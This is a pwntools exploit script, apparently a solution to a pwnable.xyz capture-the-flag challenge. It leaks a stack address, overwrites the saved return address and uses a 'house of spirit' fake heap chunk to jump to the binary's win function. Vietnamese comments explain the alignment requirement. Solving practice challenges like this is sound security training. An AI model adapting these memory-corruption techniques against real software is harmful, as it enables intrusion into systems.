#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./challenge", checksec = False)

con = process()
# gdb.attach(con, gdbscript = "b*0x4008bd")
# con = remote("svc.pwnable.xyz", 30005)

ret_gadget = 0x4008e1

def quit():
    con.sendafter(b"> ", b"0")

def option1(msg):
    con.sendafter(b"> ", b"1")
    con.send(msg)

def option2():
    con.sendafter(b"> ", b"2")
    return int(con.recvline().decode().strip("\n"), 16)

def option3():
    con.sendafter(b"> ", b"3")

if __name__ == '__main__':
    # input()
    ### Stage 1: ghi đè save rip
    leak = option2()
    log.info(hex(leak))
    rip = leak + 0x58

    option1(b"A"*8+p64(rip))
    option3()
    option1(p64(ret_gadget) + p64(leak + 0x60))

    ### Stage 2: house of spirit
    option3()
    option1(p64(elf.sym['win']) + p64(leak + 0x80) + p64(0) + p64(0x20))
    option3()
    option1(p64(0) + p64(0x20) + p64(0))
    quit()

    con.interactive()

# Giải thích:
# khi free(ptr), ptr phải chia hết cho 16 (align giống như system)